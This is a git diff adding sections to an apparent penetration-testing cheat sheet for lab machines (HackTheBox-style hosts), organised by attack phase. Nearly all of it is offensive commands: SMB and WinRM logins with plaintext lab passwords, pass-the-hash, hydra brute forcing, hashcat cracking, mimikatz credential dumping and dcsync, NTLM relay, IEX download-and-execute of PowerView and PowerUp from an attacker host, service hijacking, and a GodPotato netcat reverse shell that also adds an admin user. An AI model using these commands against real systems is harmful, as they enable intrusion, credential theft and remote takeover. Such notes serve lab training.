@@ -7,6 +7,7 @@
 - [Recon](#recon)
   - [Autorecon](#autorecon)
   - [SNMP](#snmp)
+  - [SMB](#smb)
   - [Web](#web)
     - [App](#app)
     - [subdomain](#subdomain)
@@ -26,6 +27,24 @@
 - [Foothold](#foothold)
   - [Interactiveshell](#interactiveshell)
   - [Windows](#windows-1)
+    - [SHELL](#shell)
+    - [Client Soft](#client-soft)
+- [Credential Access](#credential-access)
+  - [Brute Force](#brute-force)
+  - [hashcrack](#hashcrack)
+  - [Windows](#windows-2)
+    - [mimikatz](#mimikatz)
+- [Lateral Movement](#lateral-movement)
+  - [NTLM Relay](#ntlm-relay)
+- [Discovery](#discovery)
+  - [Windows](#windows-3)
+    - [PowerView](#powerview)
+    - [winPEAS](#winpeas)
+- [Privilege Escalation](#privilege-escalation)
+  - [Windows](#windows-4)
+    - [PowerUp](#powerup)
+    - [LOLBIN](#lolbin)
+    - [token](#token)
 - [Tips](#tips)
 
 
@@ -76,6 +95,12 @@ python3 snmpbrute.py -t 10.10.11.193
 
 # snmpwalk
 snmpwalk -c internal -v2c 10.10.11.193 
+```
+
+## SMB
+```bash
+smbclient -N -L \\\\10.129.144.138
+smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
 ```
 
 ## Web
@@ -242,6 +267,7 @@ export SHELL=/bin/bash
 reset
 ```
 ## Windows
+### SHELL
 ```powershell
 #nc.exe
 powershell -nop -c "iwr -Uri http://10.10.14.35/nc.exe -Outfile nc.exe"
@@ -259,6 +285,124 @@ powershell.exe -nop -w hidden -c "IEX(New-Object System.Net.WebClient).DownloadS
 powershell -ep bypass
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted
 ```
+### Client Soft
+```bash
+# SMB
+impacket-smbclient intelligence.htb/Tiffany.Molina:NewIntelligenceCorpUser9876@10.10.10.248
+smbclient -U tyler \\\\test\\share
+
+# psexec
+impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
+# wmiexec
+impacket-wmiexec -hashes :7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+# evil-winrm
+evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
+```
+
+
+# Credential Access
+## Brute Force
+```bash
+# hydra
+hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
+hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337" rdp://192.168.50.202
+hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:usr=user&pwd=^PASS^:Login failed. Invalid"
+```
+## hashcrack
+```bash
+# MD5-RAW: 0, NTLM: 1000, NetNTLMv2: 5600, TGS-REP: 13100
+hashcat -m 0 -a 0 crackme.txt /usr/share/wordlists/rockyou.txt -r /usr/share/john/rules/best64.rule --force
+
+# john
+john --wordlist=/usr/share/wordlists/rockyou.txt --rules=/usr/share/john/rules/best64.rule hash.txt
+```
+## Windows
+### mimikatz
+```powershell
+# PTH
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+.\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:htb.local /ntlm:cc36cf7a8514893efccd332446158b1a" "exit"
+#PTT
+.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
+
+# lsadump
+.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam"
+.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::dcsync /user:Administrator" "exit"
+```
+
+# Lateral Movement
+## NTLM Relay 
+```bash
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c 
+```
+
+# Discovery
+## Windows
+### PowerView
+```powershell
+cd /usr/share/windows-resources/powersploit/Recon/
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerView.ps1')
+```
+### winPEAS
+```powershell
+# on nc.exe
+cd /usr/share/peass/winpeas
+iwr -Uri http:// -Outfile winPEASany.exe
+# on powershell
+iwr -Uri http:// -Outfile winPEAS.bat
+```
+
+# Privilege Escalation
+## Windows
+### PowerUp
+```powershell
+cd /usr/share/windows-resources/powersploit/Privesc/
+IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/PowerUp.ps1')
+
+# john Password123!
+
+# Binary Hijacking
+Get-ModifiableServiceFile
+## AbuseFunction
+Install-ServiceBinary -Name ''
+
+# UnquotedService
+Get-UnquotedService
+## AbuseFunction  
+Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
+```
+### LOLBIN
+```powershell
+# Binary Hijacking
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+icacls "C:\xampp\mysql\bin\mysqld.exe"
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+net stop mysql
+shutdown /r /t 0 
+
+# tasks
+schtasks /query /fo LIST /v
+Get-ScheduledTask
+```
+
+### token
+```powershell
+# PrintSpoofer
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+.\PrintSpoofer64.exe -i -c powershell.exe
+
+# GodPotato
+cd /usr/share/windows-resources/binaries/
+.\GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe 10.10.14.83 9999 -e cmd"
+
+# SharpToken
+cd /usr/share/windows-resources/binaries/
+.\SharpToken.exe list_token
+.\SharpToken.exe execute "NT AUTHORITY\SYSTEM" cmd true
+.\SharpToken.exe add_user admin Abcd1234! Administrators
+```
+
+
 
 # Tips
 ```bash
